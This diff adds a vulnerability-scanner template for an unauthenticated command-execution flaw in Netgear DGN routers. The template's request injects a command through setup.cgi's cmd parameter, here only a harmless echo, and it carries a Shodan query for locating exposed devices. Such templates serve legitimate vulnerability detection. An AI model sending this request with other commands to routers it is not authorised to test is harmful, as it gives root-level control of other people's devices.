@@ -1,0 +1,30 @@
+id: netgear-dgn-rce
+
+info:
+  name: Netgear DGN Devices - Command Execution
+  author: 3th1c_yuk1
+  severity: critical
+  description: |
+    This template checks for unauthenticated command execution vulnerability in Netgear DGN devices. Attackers can bypass authentication mechanisms and execute arbitrary commands with root privileges.
+  reference:
+    - https://www.crowdsec.net/blog/netgear-rce-and-how-vulnerabilities-persist-in-the-wild
+    - https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/linux/http/netgear_dgn1000_setup_unauth_exec.md
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: "NETGEAR DGN"
+  tags: rce,netgear,dgn
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=echo%20{{randstr}}&curpath=/&currentsetting.htm=1"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body, '{{randstr}}')"
+          - "!contains(body, 'echo {{randstr}}')"
+          - "contains(content_type, 'text/plain')"
+          - "status_code== 200"
+        condition: and
